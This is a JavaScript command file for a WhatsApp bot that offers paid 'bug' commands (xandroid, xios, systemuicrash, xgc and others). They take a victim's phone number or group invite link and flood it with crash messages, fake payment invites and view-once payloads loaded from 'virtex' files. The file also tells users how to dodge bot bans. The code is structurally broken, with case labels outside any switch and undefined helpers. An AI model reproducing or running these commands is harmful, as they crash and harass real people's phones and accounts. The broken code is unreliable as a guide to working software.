//bug database
import config from '../../config.cjs';
const bugCommand = async (m, gss) => {
const prefixMatch = m.body.match(/^[\\/!#.]/);
const prefix = prefixMatch ? prefixMatch[0] : '/';
const [cmd, arg] = m.body.startsWith(prefix) ? m.body.slice(prefix.length).split(' ') : ['', ''];	
const { toge1 } = require('./src/virtex/toge1');
const { toge2 } = require('./src/virtex/toge2');
const { toge3 } = require('./src/virtex/toge3');
const { toge4 } = require('./src/virtex/toge4');
const { toge5 } = require('./src/virtex/toge5');
const { toge6 } = require('./src/virtex/toge6');
const { toge7 } = require('./src/virtex/toge7');
const { toge8 } = require('./src/virtex/toge8');
const { toge9 } = require('./src/virtex/toge9');
const { toge10 } = require('./src/virtex/toge10');
const wkwk = fs.readFileSync(`./src/virtex/x.mp3`);
const xsteek = fs.readFileSync(`./src/virtex/x.webp`);
const o = fs.readFileSync(`./src/virtex/o.jpg`);
//bug cases
case "xandroid": {
  if (!isPremium) return replygcxeon(mess.prem)
  if (!text) return replygcxeon(`Use ${prefix+command} 𝖛𝖎𝖈𝖙𝖎𝖒 𝖓𝖚𝖒𝖇𝖊𝖗|𝖆𝖒𝖔𝖚𝖓𝖙\n𝖊𝖝𝖊𝖒𝖕𝖑𝖊 ${prefix+command} 241xxxxxxxxxx,5`); 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return replygcxeon(`Use ${prefix+command} 𝖛𝖎𝖈𝖙𝖎𝖒 𝖓𝖚𝖒𝖇𝖊𝖗|𝖆𝖒𝖔𝖚𝖓𝖙\n𝖊𝖝𝖊𝖒𝖕𝖑𝖊 ${prefix+command} 241xxxxxxxxxx,5`); 
  }
  if (isNaN(parseInt(amount))) {
    return replygcxeon("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "24102150169") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
  replygcxeon("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendVariousMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲 𝐒𝐞𝐧𝐭 𝐁𝐮𝐠 𝐓𝐨 @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* ✅\n\n𝕻𝖆𝖚𝖘𝖊 2 𝖒𝖎𝖓𝖚𝖙𝖊𝖘 𝖘𝖔 𝖙𝖍𝖆𝖙 𝖙𝖍𝖊 𝖇𝖔𝖙 𝖎𝖘 𝖓𝖔𝖙 𝖇𝖆𝖓𝖓𝖊𝖉.", 
    [whatsappNumber]
  );
}
break;
case "xios": {
  if (!isPremium) return replygcxeon(mess.prem)
  if (!text) return replygcxeon(`Use ${prefix+command} 𝖛𝖎𝖈𝖙𝖎𝖒 𝖓𝖚𝖒𝖇𝖊𝖗|𝖆𝖒𝖔𝖚𝖓𝖙\n𝖊𝖝𝖊𝖒𝖕𝖑𝖊 ${prefix+command} 241xxxxxxxxxx,5`); 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return replygcxeon(`Use ${prefix+command} 𝖛𝖎𝖈𝖙𝖎𝖒 𝖓𝖚𝖒𝖇𝖊𝖗|𝖆𝖒𝖔𝖚𝖓𝖙\n𝖊𝖝𝖊𝖒𝖕𝖑𝖊 ${prefix+command} 241xxxxxxxxxx,5`); 
  }
  if (isNaN(parseInt(amount))) {
    return replygcxeon("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "24102150169") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
  replygcxeon("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMultiplePaymentInvites(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲 𝐒𝐞𝐧𝐭 𝐁𝐮𝐠 𝐓𝐨 @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* ✅\n\n𝕻𝖆𝖚𝖘𝖊 2 𝖒𝖎𝖓𝖚𝖙𝖊𝖘 𝖘𝖔 𝖙𝖍𝖆𝖙 𝖙𝖍𝖊 𝖇𝖔𝖙 𝖎𝖘 𝖓𝖔𝖙 𝖇𝖆𝖓𝖓𝖊𝖉.", 
    [whatsappNumber]
  );
}
break;
case "xios2":
  {
	if (!isPremium) return replygcxeon(mess.prem)
    if (!isBot) {
      return replygcxeon("*🔰 BOT MUST BE AN ADMIN TO USE THIS COMMAND 🔰*");
    }
    if (!text){
      return replygcxeon(`Example usage: ${prefix + command} 5`)
      }
    if (isNaN(parseInt(text))) {
      return replygcxeon("Amount must be a number");
    }
    let encodedValue = encodeURI(text) * 200; // Adjusted calculation for clarity
    replygcxeon("please wait, " + command + " bug is in process..");
    await sleep(1500); // Adjusted sleep time for clarity
    sendMultiplePaymentInvites(from, encodedValue);
    await sleep(2500); // Adjusted sleep time for clarity
    sendReaction('✅');
  }
  break;
  case "xandroid2":
  {
	if (!isPremium) return replygcxeon(mess.prem);
    if (!isBot) {
      return replygcxeon("*T");
    }
    if (!text){
      return replygcxeon(`Example usage: ${prefix + command} 5`);
      }
    if (isNaN(parseInt(text))) {
      return replygcxeon("Amount must be a number");
    }
    let encodedValue = encodeURI(text) * 200; // Adjusted calculation for clarity
    replygcxeon("please wait, " + command + " bug is in process..");
    await sleep(1500); // Adjusted sleep time for clarity
    sendVariousMessages(from, encodedValue);
    await sleep(2500); // Adjusted sleep time for clarity
    sendReaction('✅');
  }
  break;
  case "xgc":
  {
    if (!isPremium) return replygcxeon(mess.prem);
    if (!text) {
      return replygcxeon("𝙷𝙾𝚆 𝚃𝙾 𝚂𝙴𝙽𝙳 𝙱𝚄𝙶 𝚃𝙾 𝙶𝚁𝙾𝚄𝙿\n\n" + (prefix + command) + " https://chat.whatsapp.com/xxxx\n\n_*Note:*_ If you want to send a large number of bugs, please type as follows\n\nEx: ." + command + " linkgc amount\n\nExample:\n." + command + " https://chat.whatsapp.com/xxxx 10");
    }
    replygcxeon("please wait, " + command + " bug is in process..");
    if (!text.split(" ")[0].includes("whatsapp.com")) {
      return replygcxeon("Link Invalid!");
    }
    let groupLink = text.split(" ")[0].split("https://chat.whatsapp.com/")[1];
    try {
      let bugAmount = text.split(" ")[1] ? text.split(" ")[1] : '1';
      let groupTarget = await XeonBotInc.groupAcceptInvite(groupLink);
      await sleep(2000); // Adjusted sleep time for clarity
      sendViewOnceMessages(groupTarget, bugAmount);
      await sleep(2500); // Adjusted sleep time for clarity
      replygcxeon("𝐃𝐎𝐍𝐄✅ 𝐁𝐔𝐆 𝐇𝐀𝐒 𝐁𝐄𝐄𝐍 𝐒𝐄𝐍𝐓 𝐓𝐎 𝐓𝐇𝐄 𝐆𝐑𝐎𝐔𝐏!.");
      XeonBotInc.groupLeave(groupTarget);
    } catch (error) {
      replygcxeon(util.format(error));
    }
  }
  break;
  case "systemuicrash": {
  if (!isPremium) return replygcxeon(mess.prem)
  if (!text) return replygcxeon(`Use ${prefix+command} 𝖛𝖎𝖈𝖙𝖎𝖒 𝖓𝖚𝖒𝖇𝖊𝖗|𝖆𝖒𝖔𝖚𝖓𝖙\n𝖊𝖝𝖊𝖒𝖕𝖑𝖊 ${prefix+command} 241xxxxxxxxxx,5`); 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return replygcxeon(`Use ${prefix+command} 𝖛𝖎𝖈𝖙𝖎𝖒 𝖓𝖚𝖒𝖇𝖊𝖗|𝖆𝖒𝖔𝖚𝖓𝖙\n𝖊𝖝𝖊𝖒𝖕𝖑𝖊 ${prefix+command} 241xxxxxxxxx,5`); 
  }
  if (isNaN(parseInt(amount))) {
    return replygcxeon("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "24102150169") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
  replygcxeon("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲 𝐒𝐞𝐧𝐭 𝐁𝐮𝐠 𝐓𝐨 @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* ✅\n\n𝕻𝖆𝖚𝖘𝖊 2 𝖒𝖎𝖓𝖚𝖙𝖊𝖘 𝖘𝖔 𝖙𝖍𝖆𝖙 𝖙𝖍𝖊 𝖇𝖔𝖙 𝖎𝖘 𝖓𝖔𝖙 𝖇𝖆𝖓𝖓𝖊𝖉.", 
    [whatsappNumber]
  );
}
break;
case "xsysui": {
  if (!isPremium) return replygcxeon(mess.prem)
  if (!text) return replygcxeon(`Use ${prefix+command} 𝖛𝖎𝖈𝖙𝖎𝖒 𝖓𝖚𝖒𝖇𝖊𝖗|𝖆𝖒𝖔𝖚𝖓𝖙\n𝖊𝖝𝖊𝖒𝖕𝖑𝖊 ${prefix+command} 241xxxxxxxxxx,5`); 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return replygcxeon(`Use ${prefix+command} 𝖛𝖎𝖈𝖙𝖎𝖒 𝖓𝖚𝖒𝖇𝖊𝖗|𝖆𝖒𝖔𝖚𝖓𝖙\n𝖊𝖝𝖊𝖒𝖕𝖑𝖊 ${prefix+command} 241xxxxxxxxxx,5`); 
  }
  if (isNaN(parseInt(amount))) {
    return replygcxeon("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "24102150169") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
  replygcxeon("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendRepeatedMessages2(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲 𝐒𝐞𝐧𝐭 𝐁𝐮𝐠 𝐓𝐨 @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* ✅\n\n𝕻𝖆𝖚𝖘𝖊 2 𝖒𝖎𝖓𝖚𝖙𝖊𝖘 𝖘𝖔 𝖙𝖍𝖆𝖙 𝖙𝖍𝖊 𝖇𝖔𝖙 𝖎𝖘 𝖓𝖔𝖙 𝖇𝖆𝖓𝖓𝖊𝖉", 
    [whatsappNumber]
  );
}
break;
case 'clearall': {
if (!isCreator) return replygcxeon(mess.owner)
XeonBotInc.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] }, m.chat);
}
break
case 'clearchat':
xeonimun('\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n');
break
};
